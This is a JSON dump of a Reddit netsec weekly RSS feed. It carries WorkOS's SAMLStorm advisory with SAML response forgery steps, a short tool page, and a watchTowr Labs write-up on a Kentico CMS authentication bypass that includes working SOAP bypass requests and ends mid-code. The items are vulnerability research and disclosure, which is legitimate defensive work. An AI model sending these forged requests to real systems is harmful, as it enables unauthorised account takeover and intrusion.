{"id":"sML2JBPsdAyS6VtxX1nYrwK8E9RQ5WvH1LNVbcmAV1wNnbFFD7qWbUHZZMepDPsG","title":"top scoring links : netsec","displayTitle":"Reddit - NetSec","url":"https://www.reddit.com/r/netsec/top/.rss?t=week","feedLink":"https://www.reddit.com/r/netsec/top/?t=week","isQuery":false,"isEmpty":false,"isHidden":false,"itemCount":25,"items":[{"title":"SAMLStorm: Critical Authentication Bypass in xml-crypto and Node.js libraries","url":"https://workos.com/blog/samlstorm","date":1742218380,"author":"/u/Smooth-Loquat-4954","guid":957,"unread":true,"content":"<p>On Tuesday, March 4, 2025, WorkOS received a critical security report from researcher Alexander Tan (<a href=\"https://hackerone.com/ahacker1/\">ahacker1</a>) detailing a zero-day vulnerability in the widely used  and SAML libraries in the Node.js ecosystem. This flaw allows attackers to forge SAML authentication responses, potentially granting unauthorized access to any user account in affected applications—including admin accounts—without any user interaction. If exploited, this vulnerability could enable full account takeovers across organizations relying on SAML-based single sign-on (SSO).</p><p>WorkOS immediately mobilized its security and engineering teams, following an established incident response process to assess the risk and deploy a fix. <strong>Within 24 hours, WorkOS had patched the vulnerability for all customers, ensuring no WorkOS-integrated applications remained exposed. A thorough review of system logs confirmed no evidence of past compromise affecting WorkOS customers.</strong></p><p>To further protect the broader cloud ecosystem, WorkOS proactively worked with other identity platforms, various startups, and library maintainers, to accelerate remediation efforts across the industry.</p><p>The SAMLStorm vulnerability affects the  Node.js library (v6.0.0 and earlier, <a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3\">CVE-2025-29775</a> &amp; <a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g\">CVE-2025-29774</a>), with a fix introduced in v6.0.1 and backported to v3.2.1 and v2.1.6. It also affects Node.js SAML implementations including , , , , , and others. Collectively these packages have over 500k weekly downloads. </p><p>Full technical details of this exploit, how it works, and remediation steps for non-WorkOS services are covered below.</p><h2>How this zero-day enables full account takeovers</h2><p>Before diving into the details of the SAML protocol and how this vulnerability works, it’s important to first outline the potential impact at a high level. </p><p>Any company providing SSO services via SAML that uses the  library is at risk. In the worst case, an external threat actor could forge arbitrary assertions for a SAML identity provider (IdP), potentially leading to full account takeovers within affected service providers depending on their security measures.</p><p>This exploit requires no user interaction, meaning an attacker could gain unauthorized access to the targeted application with escalated privileges.</p><h2>SAML basics: understanding the attack surface</h2><p>There are two similar but distinct vulnerabilities in  represented by <a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3\">CVE-2025-29775</a> &amp; <a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g\">CVE-2025-29774</a>, the first which is exploitable via node-saml and the second which is not. For brevity, this post focuses only on the vulnerability and exploitation vector that affect usage of node-saml, and which were initially reported to WorkOS.</p><p>To understand this vulnerability, we first need to understand a bit about how SAML works.</p><ol role=\"list\"><li>A user attempts to access the service provider.</li><li>The service provider creates an XML-based SAML request.</li><li>The browser redirects to the IdP with the SAML request.</li><li>The IdP processes the SAML request and asks the user to authenticate.</li><li>The IdP generates a SAML response with an assertion and returns it to the browser. In SAML, assertions are used to communicate details about an identity.</li><li>The browser forwards the SAML response with the assertion back to the service provider. In the exploit, this is the step where the SAML response would be forged.</li><li>The service provider validates the SAML response and returns the authentication context to the browser if valid.</li></ol><p>Here is what a normal SAML response looks like:</p><pre contenteditable=\"false\"><code>    ...\n                    ...\n            ...\n        ...\n</code></pre><h2>How an attacker would exploit this vulnerability</h2><p>There are a few general conditions that must be met to exploit a service provider:</p><ol role=\"list\"><li>The service provider must be using xml-crypto.</li><li>The attacker needs any valid signature and digest pair from an identity provider.</li><li>The service provider needs to trust the identity provider’s certificate in its SAML configuration.</li><li>The attacker needs access to the ACS URL, SP Entity ID, and IdP Entity ID:<ol role=\"list\"><li>ACS URL – The endpoint where the Identity Provider sends its authentication response.</li><li>SP Entity ID – A URI that identifies the audience of the SAML response.</li><li>IdP Entity ID – A URI that identifies the issuer of the SAML response.</li></ol></li></ol><p>These conditions lead to the following exploitation scenarios:</p><h3>Attack path 1: full access without an account</h3><p>How the attack works for a threat actor without an identity in the identity provider:</p><ol role=\"list\"><li>Go to the target app using an email that redirects to an identity provider with publicly signed metadata. Note that this is not a security vulnerability in these identity providers—they simply provide information that an attacker could use to exploit the flaw in .</li><li>When attempting to sign in, a SAML request will be issued, from which you can pull the ACS URL and SP Entity ID, which is necessary to craft the SAML response</li><li>Pull the certificate and signature info, as well as the IdP Entity ID, from the public metadata</li><li>Craft a SAML response with the certificate and signed value from metadata</li><li>Modify the SAML assertion</li><li>Recalculate the DigestValue and insert it as comment before the existing digest value within the DigestValue node</li><li>Send a request with the crafted SAML response to the ACS URL</li><li>The service provider validates the response, and you’ve authenticated</li></ol><p>Note this exploitation scenario partially relies on the SP-initiated flow to get the ACS URL and SP Entity ID, but sometimes ACS URLs and SP Entity IDs are predictable and documented.Here is what a tampered SAML response might look like:</p><pre contenteditable=\"false\"><code>    ...\n                    ...\n            ...\n        ...\n</code></pre><h3>Attack path 2: abusing legitimate access for privilege escalation</h3><p>There’s a variation of this attack that affects all service providers using , regardless of whether signed public metadata is available. However, it requires the attacker to have an identity in the identity provider and at least one provisioned app.</p><ol role=\"list\"><li>Attempt to log in to the service provider using either the IdP or SP-initiated flows</li><li>Intercept the request to the ACS URL containing the SAML response</li><li>Modify the SAML assertion as needed</li><li>Recalculate the SAML assertion digest and insert the new digest value as a comment in the SAML Signature DigestValue node</li><li>Replace the SAML response in the request with your crafted SAML response</li><li>Forward the request to ACS URL</li><li>The service provider validates the response, and you’ve authenticated</li></ol><h2>Breaking the chain of trust: How xml-crypto fails</h2><p>This section explains the root cause of the vulnerability within the  library. Readers may note the presence of a common pattern in security vulnerabilities, where two components of a system disagree on how to interpret the same data.</p><p>For a SAML service provider to securely trust an assertion in a SAML response, it must validate the IdP’s cryptographic signature. This  starts with the IdP’s X.509 certificate, extends to the signature over a  block, includes the assertion digest within , and ultimately ends with the assertion itself.</p><p>The diagram below illustrates how the chain of trust is broken in the SAMLStorm attack.</p><p>In the  library, the assertion digest check ensures that the digest in the  block correctly corresponds to the assertion, while the signature check verifies that the signature is valid based on the IdP’s certificate and the  block. In normal operation, the signature protects an assertion from modification, because the assertion digest is included in the  block.</p><p>The core issue in this vulnerability is that these two checks evaluate the SAML document differently. SAML documents undergo , a process that removes XML comments. However, the assertion digest checks are performed on the  document (which retains comments), while the signature checks are performed on the  document (which strips comments). This mismatch creates an opportunity for exploitation via the insertion of a forged digest inside a comment, as shown below.</p><pre contenteditable=\"false\"><code></code></pre><p>In the vulnerable code, the SAML assertion digest check retrieves the  of the  node. Normally, this is the expected digest value, but an attacker can insert an XML comment containing a  of their own arbitrary assertion  the legitimate digest. As a result, the assertion digest check mistakenly uses the attacker’s digest.</p><p>Meanwhile, the signature check is performed on the  block  it has been . Since the malicious comment is stripped during canonicalization, only the original (legitimate) assertion digest remains, allowing the signature check to pass.</p><p>This breaks the  between the certificate and the assertion, enabling an attacker to forge arbitrary assertions that a vulnerable service provider will accept as valid.</p><h2>Understanding if your application may be impacted </h2><p>Any customer of a service provider using a vulnerable version of the  library is at risk, though the level of risk depends on the specific service provider and whether the threat actor has an identity within an identity provider (IdP). If the attacker has an identity from any IdP connected to the service provider, they can exploit this vulnerability against any SAML identity provider, as long as the service provider relies on .</p><p>If the threat actor does  have an identity within the IdP, they can still exploit this vulnerability—but only against identity providers that sign their provider metadata. Many major IdPs sign their provider metadata. While this is not a security vulnerability in these identity providers, it does expose information that an attacker could leverage to exploit the bug in .</p><p>If an application does not independently verify account ownership, a threat actor could forge authentication for  user within an organization, including admin users, and escalate privileges using SAML attributes or IdP group assignments. Additionally, if an application does not restrict which users an IdP is allowed to authenticate, an attacker could forge authentication for any user in the service provider’s application, regardless of organization boundaries.</p><h2>Recommendations for impacted organizations</h2><h3>Short-term recommendations </h3><p>WorkOS has already patched this vulnerability and confirmed that no systems or customers were affected. However, other non-WorkOS auth systems may still be at risk. We recommend the following steps:</p><ol role=\"list\"><li>Contact any applications where you authenticate via SAML SSO to ask if they were impacted and what risk remains.</li><li>Review audit logs in affected applications for any suspicious logins or activity.</li></ol><ol role=\"list\"><li>Check if your SAML implementation uses the  package.</li><li>If it does, review your SAML logs for signs of exploitation. Specifically, look for comments embedded in the  field of the response, for example:</li></ol><pre contenteditable=\"false\"><code></code></pre><h3>Long-term recommendations</h3><ol role=\"list\"><li>Regularly review your organization’s exposure to applications protected by SSO, and keep an up-to-date inventory of all such vendors, with security contact information for and notes about the type of data stored by each.</li><li>Choose vendors that support fully-featured security audit logging capabilities so you can independently review access to your data as needed.</li></ol><ol role=\"list\"><li>In general, checking that received data conforms to basic expectations before processing it serves as a valuable defense-in-depth mechanism against unknown vulnerabilities. Consider applying this principle to SAML responses to ensure their structure matches what is expected, especially for the certificates, signatures, and digests involved in the chain of trust. For example,  was unaffected by the exploitation vector in <a href=\"https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g\">CVE-2025-29774</a> because it checks whether the number of references in the  block matches the expected value of one before passing the response to  for further validation.</li></ol><h2><strong>WorkOS' rapid response timeline:</strong></h2><ul role=\"list\"><li> – Report received, immediate triage</li><li> – Full patch deployed, customers secured</li><li> – Industry-wide notifications sent to identity and auth vendors</li><li>– Public disclosure</li></ul><p>We would like to thank Alexander Tan (<a href=\"https://hackerone.com/ahacker1/\">ahacker1</a>) for his responsible disclosure and collaboration with the WorkOS Security Team. Special thanks also to <a href=\"https://securitylab.github.com/\">GitHub Security Lab</a>, <a href=\"https://www.latacora.com/\">Latacora</a>, and Chris Barth (maintainer of node-saml) for their contributions.</p><p>WorkOS is committed to proactive security and rapid response and was the first company to detect, patch, and disclose SAMLStorm. We continue leading in securing authentication infrastructure for customers including OpenAI, Cursor, Perplexity, Vercel, Plaid, and hundreds more. If you have a security report to share, please contact <a href=\"mailto:security@workos.com\">security@workos.com</a>.</p>","contentLength":12268,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jdcq48/samlstorm_critical_authentication_bypass_in/"},{"title":"[Tool] TruffleShow: A Client-Side Web Viewer for TruffleHog Outputs","url":"https://truffleshow.dev/","date":1742217456,"author":"/u/pelesenk","guid":958,"unread":true,"content":"<p>\n      A simple web viewer for TruffleHog JSON output.\n    </p><p>\n      Currently supported sources: </p><div x-show=\"!isFileUploaded\"><h2>\n        Upload TruffleHog JSON Output\n      </h2><div><p>\n          Pipe the output with  to fix broken JSON.\n          See <a href=\"https://github.com/trufflesecurity/trufflehog/issues/2164\" target=\"_blank\">#2164</a> for more.\n        </p></div></div>","contentLength":231,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jdcen1/tool_truffleshow_a_clientside_web_viewer_for/"},{"title":"Bypassing Authentication Like It’s The ‘90s - Pre-Auth RCE Chain(s) in Kentico Xperience CMS - watchTowr Labs","url":"https://labs.watchtowr.com/bypassing-authentication-like-its-the-90s-pre-auth-rce-chain-s-in-kentico-xperience-cms/","date":1742214352,"author":"/u/dx7r__","guid":940,"unread":true,"content":"<p>I recently joined watchTowr, and it is, therefore, time - time for my first watchTowr Labs blogpost, previously teased in a <a href=\"https://x.com/chudyPB/status/1884266270415376674?ref=labs.watchtowr.com\" rel=\"noopener noreferrer\">tweet</a> of a pre-auth RCE chain affecting some ‘unknown software’.</p><p>Joining the team, I wanted to maintain the trail of destruction left by the watchTowr Labs team, and so had to get my teeth into things quickly.</p><p>Two primary goals were clear:</p><ol><li>Look at something completely new - I quickly realized that I've never looked at any CMS solution, and so could be a fun good start.</li><li>Fulfill the ethos - pure pwnage, or don’t bother.</li></ol><p>Kentico’s Xperience CMS stood out as promising, fulfilling several key criteria:</p><ul><li>Written in C# (a familiar language, thank you Exchange).</li><li>Used and leveraged widely by watchTowr Platform customers.</li><li>Popular amongst large enterprises</li><li>A suspiciously minimal amount of critical/high-severity vulnerabilities in the past.</li><li>Attackers recognize the value of Kentico’s CMS - re: CVE-2019-10068 being exploited in the wild.</li></ul><p>This meets the criteria of something we’d define as “interesting,” so we began. A few hours later, (sigh), we stumbled into our first Authentication Bypass vulnerability.</p><p>Throughout this research, we identified the following vulnerabilities:</p><ul><li>WT-2025-0006 Authentication Bypass</li><li>WT-2025-0007 Post-Authentication Remote Code Execution</li><li>WT-2025-0011 Authentication Bypass</li></ul><p>As we walk through this analysis, we’ll take you on our journey that allowed us to build exploit chains to achieve Remote Code Execution against (at the time) fully patched Kentico Xperience CMS deployments.</p><p>Time to dive in… (and until next time..)</p><blockquote>Disclaimer: You are probably used to reading my heavily technical blog posts - this won’t change. However, the watchTowr Labs style is.. unique. Thus, expect memes, terrible jokes and a lot of poor humor woven in.</blockquote><p>Before we even start deep diving into the vulnerabilities, we want to be clear that the vulnerabilities highlighted in this blogpost <strong>do not affect every Kentico CMS installation (but do appear to affect common configurations)</strong>.</p><p>For the vulnerabilities we’re about to discuss, two requirements need to be fulfilled:</p><ul><li>The Staging (or ‘Sync’) Service needs to be enabled on the target (disabled by default).</li><li>The Staging Service needs to be configured with username/password authentication (as opposed to X.509-based authentication option, which is not affected).</li></ul><p>However, based on our dataset and exposure across the watchTowr client base, we can confidently say that the above requirements appear to be a common configuration - please do not write these weaknesses off as requiring edge cases. Reassuringly, this seriousness and severity was reflected in the vendors response - the Kentico security team treated all vulnerabilities seriously, and we’ll discuss this further later.</p><p>Our research, initially, was performed our initial research on Kentico Xperience 13.0.172.</p><ul><li>WT-2025-0006 was resolved in Kentico Xperience 13.0.173.</li></ul><p>We also found a second Authentication Bypass, while reviewing Kentico Xperience 13.0.173.</p><ul><li>WT-2025-0011 was resolved in Kentico Xperience 13.0.178.</li></ul><p>Although we never reviewed version 12 of Kentico Xperience (or below), we have high-confidence data that version 12 is also vulnerable to both WT-2025-0006 Authentication Bypass and WT-2025-0011 Authentication Bypass.</p><p>To get your system into a vulnerable position while you follow this post along at home, a Kentico administrative user can enable the Staging Service within the CMS settings functionality, while selecting the  authentication type, as presented in the next screenshot.</p><p>With this configuration complete, the next step is to investigate how this authentication is being performed. Let's dive into the technical details!</p><h3>WT-2025-0006 Authentication Bypass</h3><p>When we review new solutions, as we’ve described before a basic aim is to understand the exposed attack surface of the solution and quickly get a feel for how it has been architected.</p><p>In case of web applications, you may want to look for some REST- or SOAP-based APIs. Interestingly, Kentico’s Experience CMS does not expose a significant number of webservices and endpoints, presenting a relatively small attack surface.</p><p>However, a service called <code>CMS.Synchronization.WSE3.SyncServer</code> immediately caught our attention.</p><p>It exposes a single endpoint, and was interesting for two reasons:</p><ul><li>It performs (pre-hardened) -based deserialization (we later learned that it was hardened/patched as a result of CVE-2019-10068).</li><li><a href=\"https://docs.kentico.com/13/deploying-websites/content-staging?ref=labs.watchtowr.com\">Documentation</a> suggests that it may potentially allow you to gain full control over CMS pages.</li></ul><p>Sounds like fun! Let's try to send a simple HTTP request targeting this web method and just see what happens through the power of FAFO:</p><pre><code>POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: hostname\nContent-Type: text/xml; charset=utf-8\nContent-Length: 438\nSOAPAction: \"&lt;http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData&gt;\"\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:soap=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\"&gt;\n  &lt;soap:Body&gt;\n    &lt;ProcessSynchronizationTaskData xmlns=\"&lt;http://localhost/SyncWebService/SyncServer&gt;\"&gt;\n      &lt;stagingTaskData&gt;watchTowr&lt;/stagingTaskData&gt;\n    &lt;/ProcessSynchronizationTaskData&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre><p>We’re presented with the following error message:</p><pre><code>&lt;faultstring&gt;Server was unable to process request. ---&amp;gt; Missing username token, please check authentication type&lt;/faultstring&gt;\n</code></pre><p>In the screenshot above presenting the definition of , you may have noticed a mysterious  attribute.</p><p>Its full class name is <code>Microsoft.Web.Services3.PolicyAttribute</code>, and it's implemented in <code>Microsoft.Web.Services3.dll</code>. We've never heard of this DLL before, and so found ourselves scratching our heads a little here.</p><p>A quick Google search revealed that this is part of obsolete (probably since 2012) Web Services Enhancement 3.0 for Microsoft .NET. This is likely superseded by .NET WCF, but it's easy to get confused here and thus looked like an interesting item to further examine.</p><p>A brief investigation showed that we are dealing with  - an extension to SOAP which is supposed to add a security layer to the protocol.</p><p>Sounds complex, but it’s not, and should be enough to extend our SOAP body with the appropriate SOAP header (see  tag):</p><pre><code>POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: hostname\nContent-Type: text/xml; charset=utf-8\nContent-Length: 868\nSOAPAction: \"&lt;http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData&gt;\"\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:soap=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\"&gt;\n  &lt;soap:Header&gt;\n    &lt;wsse:Security xmlns:wsse=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\"&gt;\n      &lt;wsse:UsernameToken&gt;\n        &lt;wsse:Username&gt;watchTowr&lt;/wsse:Username&gt;\n        &lt;wsse:Password Type=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText&gt;\"&gt;watchTowr&lt;/wsse:Password&gt;\n      &lt;/wsse:UsernameToken&gt;\n    &lt;/wsse:Security&gt;\n  &lt;/soap:Header&gt;\n  &lt;soap:Body&gt;\n    &lt;ProcessSynchronizationTaskData xmlns=\"&lt;http://localhost/SyncWebService/SyncServer&gt;\"&gt;\n      &lt;stagingTaskData&gt;watchTowr&lt;/stagingTaskData&gt;\n    &lt;/ProcessSynchronizationTaskData&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre><p>We define a , which consists of both  and  values.</p><p>Now, we need to know how the credentials are being identified. The entire token verification is implemented in the <code>Microsoft.Web.Services3.Security.Tokens.UsernameTokenManager</code> class.</p><p>Three critical methods are defined here which are of interest to us:</p><ul><li>, which triggers the entire token verification procedure.</li><li>, which is supposed to retrieve a valid password for the given username.</li><li>, which is supposed to compare our password with the password retrieved from the .</li></ul><p>However, developers are welcome to do whatever they want with computers, including extending the  and overriding methods in order to customize the procedure.</p><p>This is what Kentico does with its <code>CMS.Synchronization.WSE3.WebServiceAuthorization</code> class:</p><pre><code>namespace CMS.Synchronization.WSE3\n{\n    public class WebServiceAuthorization : UsernameTokenManager\n    {\n        public override void VerifyToken(SecurityToken token)\n        {\n            if (StagingTaskRunner.ServerAuthenticationType(SiteContext.CurrentSiteName) == ServerAuthenticationEnum.UserName)\n            {\n                base.VerifyToken(token);\n            }\n        }\n    //...\n}\n</code></pre><p>In the above snippet, we can see that the overridden  calls it’s parent equivalent when dealing with username/password-based authentication.</p><p>Back to the <code>UsernameTokenManager.VerifyToken</code> then!</p><pre><code>public override void VerifyToken(SecurityToken token)\n{\n    if (token == null)\n    {\n        throw new ArgumentNullException(\"token\");\n    }\n    UsernameToken usernameToken = token as UsernameToken;\n    if (usernameToken == null)\n    {\n        throw new ArgumentException(SR.GetString(\"WSE561\", new object[]\n        {\n            typeof(UsernameToken).FullName\n        }), \"token\");\n    }\n    string text = this.AuthenticateToken(usernameToken); // [1]\n    if (text == null || text.Length == 0)\n    {\n        UsernameToken usernameToken2 = this.TokenCache[usernameToken.Username] as UsernameToken;\n        if (usernameToken2 != null &amp;&amp; usernameToken2 != null &amp;&amp; usernameToken2.Password != null &amp;&amp; usernameToken2.Password.Length &gt; 0)\n        {\n            text = usernameToken2.Password;\n        }\n    }\n    this.VerifyPassword(usernameToken, text); // [2]\n    usernameToken.SetAuthenticatedPassword(text);\n}\n</code></pre><p>The overall algorithm is pretty straightforward. There are two crucial steps:</p><p>At , the code calls  and it returns the  string. It should be equal to the user's valid password.</p><p>At , the  is called. It will compare the string from  with the password string provided in the SOAP header.</p><p>The  is overridden by Kentico’s , and the fun starts here.</p><pre><code>protected override string AuthenticateToken(UsernameToken token)\n{\n    if (token == null)\n    {\n        throw new ArgumentNullException(\"[WebServiceAuthorization.AuthenticateToken]: Missing username authentication token.\");\n    }\n    AbstractStockHelper&lt;RequestStockHelper&gt;.Add(\"AUTH_PROCESSED\", true, false);\n    string value = SettingsKeyInfoProvider.GetValue(SiteContext.CurrentSiteName + \".CMSStagingServiceUsername\"); // [1]\n    string text = EncryptionHelper.DecryptData(SettingsKeyInfoProvider.GetValue(SiteContext.CurrentSiteName + \".CMSStagingServicePassword\")); // [2]\n    if (string.IsNullOrEmpty(text))\n    {\n        throw new SecurityException(\"[WebServiceAuthorization.AuthenticateToken]: Staging does not work with blank password. Set a password on the target server.\");\n    }\n    if (value == token.Username) // [3]\n    {\n        return StagingTaskRunner.GetSHA1Hash(text); // [4]\n    }\n    return \"\"; // [5]\n}\n\n</code></pre><p>At , the code retrieves the  for the Staging Service (from the configuration).</p><p>At , it retrieves the password for the configured user (also from the configuration).</p><p>At , it verifies if the attacker-provided username (delivered through the SOAP request) matches the configured username.</p><ul><li>If yes, it will return a SHA1 hash of a password at .</li><li><strong>If not, it will return an empty string at .</strong></li></ul><p>In simple terms, this sounds fairly unbelievable - if you provide an improper (ie, non-existent) username, the method will return an empty password. What if we tried to just deliver an empty password to bypass authentication?</p><p>Well, we of course, tried - and the result is as follows:</p><pre><code>&lt;faultstring&gt;An invalid security token was provided ---&amp;gt; The incoming Username token must contain password if the password option is set to be SendPlainText.&lt;/faultstring&gt;\n</code></pre><p>As we discovered, there is a validation method in the WSE3 library which will throw an exception when we deliver an empty password. Perhaps you could possibly try different encoding and other tricks to smuggle an empty password - who knows?</p><p>As part of onboarding at watchTowr, the importance of raccoon memes is highlighted and this little bud set the mood.</p><p>Taking the raccoon’s words to heart, we decided to look around a little bit more (before inevitably overcomplicating things).</p><p>There's still one more method to check: .</p><pre><code>protected virtual void VerifyPassword(UsernameToken token, string authenticatedPassword)\n{\n    //...\n    case PasswordOption.SendHashed:\n        this.VerifyHashedPassword(token, authenticatedPassword);\n        return;\n    case PasswordOption.SendPlainText:\n        this.VerifyPlainTextPassword(token, authenticatedPassword);\n        break;\n    default:\n        return;\n    }\n}\n</code></pre><p>You might notice that we have two different password verification types available:</p><ul></ul><p>This looks promising. While we may not be able to deliver an empty password, a hash of an empty string is likely a feasible option.</p><p>Does Kentico CMS enforce the -based verification, you ask? Nope.</p><p>This function is delegated to the WSE3 library, and it operates strictly on the attacker-controlled XML. It is enough to switch the  attribute of  tag from  to , just like this:</p><pre><code>POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: hostname\nContent-Type: text/xml; charset=utf-8\nContent-Length: 973\nSOAPAction: \"&lt;http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData&gt;\"\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:soap=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\"&gt;\n  &lt;soap:Header&gt;\n    &lt;wsse:Security xmlns:wsse=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\" xmlns:wsu=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&gt;\"&gt;\n      &lt;wsse:UsernameToken&gt;\n        &lt;wsse:Username&gt;watchTowr&lt;/wsse:Username&gt;\n        &lt;wsse:Password Type=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest&gt;\"&gt;watchTowr-something-watchTowr&lt;/wsse:Password&gt;\n      &lt;/wsse:UsernameToken&gt;\n    &lt;/wsse:Security&gt;\n  &lt;/soap:Header&gt;\n  &lt;soap:Body&gt;\n    &lt;ProcessSynchronizationTaskData xmlns=\"&lt;http://localhost/SyncWebService/SyncServer&gt;\"&gt;\n      &lt;stagingTaskData&gt;watchTowr&lt;/stagingTaskData&gt;\n    &lt;/ProcessSynchronizationTaskData&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre><p>and just like that, you are able to force the use of hash-based password verification!</p><p>How can we deliver a hashed password, then? It's all described in <a href=\"https://docs.oasis-open.org/wss/v1.1/wss-v1.1-spec-pr-UsernameTokenProfile-01.htm?ref=labs.watchtowr.com#_Toc104276211\">this standard</a>. It’s very dry, and hard to read, so reviewing the code was easier:</p><pre><code>public static byte[] ComputePasswordDigest(byte[] nonce, DateTime created, string secret)\n{\n\tif (nonce == null || nonce.Length == 0)\n\t{\n\t\tthrow new ArgumentNullException(\"nonce\");\n\t}\n\tif (secret == null)\n\t{\n\t\tthrow new ArgumentNullException(\"secret\");\n\t}\n\tbyte[] bytes = Encoding.UTF8.GetBytes(XmlConvert.ToString(created.ToUniversalTime(), \"yyyy-MM-ddTHH:mm:ssZ\"));\n\tbyte[] bytes2 = Encoding.UTF8.GetBytes(secret);\n\tbyte[] array = new byte[nonce.Length + bytes.Length + bytes2.Length];\n\tArray.Copy(nonce, array, nonce.Length);\n\tArray.Copy(bytes, 0, array, nonce.Length, bytes.Length);\n\tArray.Copy(bytes2, 0, array, nonce.Length + bytes.Length, bytes2.Length);\n\treturn UsernameToken.Hash(array);\n}\n</code></pre><p>In the SOAP header, 4 items are required:</p><ul><li>Timestamp, in the following format: </li></ul><p>The hash calculation is as simple as this:</p><p><code>sha1(nonce + timestamp + password)</code></p><p>Looks almost alright, as long as the  is a real secret.</p><p>As we eluded to previously, in reality with our new ‘return an empty string’ issue, the calculation can be simplified to this when you provide an invalid username:</p><p>As we control both the  and the , we can craft a valid authentication token!</p><p>This happens because the custom  returned an empty string instead of throwing an exception for an invalid username. Unfortunately, it seems Kentico overlooked the possibility of selecting a hash-based password verification mode.</p><p>Nevertheless, here is a sample HTTP Request that bypasses authentication:</p><pre><code>POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: hostname\nContent-Type: text/xml; charset=utf-8\nContent-Length: 1055\nSOAPAction: \"&lt;http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData&gt;\"\n\n&lt;soap:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:soap=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\"&gt;\n  &lt;soap:Header&gt;\n    &lt;wsse:Security xmlns:wsse=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\" xmlns:wsu=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&gt;\"&gt;\n      &lt;wsse:UsernameToken&gt;\n        &lt;wsse:Username&gt;watchTowr&lt;/wsse:Username&gt;\n        &lt;wsse:Password Type=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest&gt;\"&gt;OZ/c8o7h3mtigow7HXu0f+BUgLk=&lt;/wsse:Password&gt;\n        &lt;wsse:Nonce&gt;MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM=&lt;/wsse:Nonce&gt;\n        &lt;wsu:Created&gt;2025-01-01T03:34:56Z&lt;/wsu:Created&gt;\n      &lt;/wsse:UsernameToken&gt;\n    &lt;/wsse:Security&gt;\n  &lt;/soap:Header&gt;\n  &lt;soap:Body&gt;\n    &lt;ProcessSynchronizationTaskData xmlns=\"&lt;http://localhost/SyncWebService/SyncServer&gt;\"&gt;\n      &lt;stagingTaskData&gt;watchTowr&lt;/stagingTaskData&gt;\n    &lt;/ProcessSynchronizationTaskData&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre><p>Yes, it’s 2025, and we are looking at the type of Authentication Bypass we’d expect to have found in the 90s (or, so we’re told).</p><h3>WT-2025-0007: Post-Auth Remote Code Execution</h3><p>Leveraging this Authentication Bypass, we now have full administrative access to Kentico’s Staging SOAP API.</p><p>In fact, better - we have access with  rights . In simple terms, this means that our work until this point has allowed us to demonstrate an ability to gain full control over the Kentico Xperience CMS.</p><p>While you could look for intrusive ways to achieve the RCE at this point (configuration changes, etc.), this is not the level of recklessness and cowboy-esque behavior clients expect of watchTowr.</p><p>Therefore, we decided to look for something more elegant though, and as you have likely already guessed - found a vulnerability within an authenticated API that allowed this.</p><p>Let’s verify what happens in the <code>ProcessSynchronizationTaskData</code> method:</p><pre><code>[WebMethod(MessageName = \"ProcessSynchronizationTaskData\")]\npublic virtual string ProcessSynchronizationTaskData(string stagingTaskData)\n{\n    string text = this.CheckStagingFeature(); // [1]\n    if (!string.IsNullOrEmpty(text))\n    {\n        return text;\n    }\n    StagingTaskData stagingTaskData2 = StagingTaskDataSoapSerializer.Deserialize(stagingTaskData); // [2]\n    text = 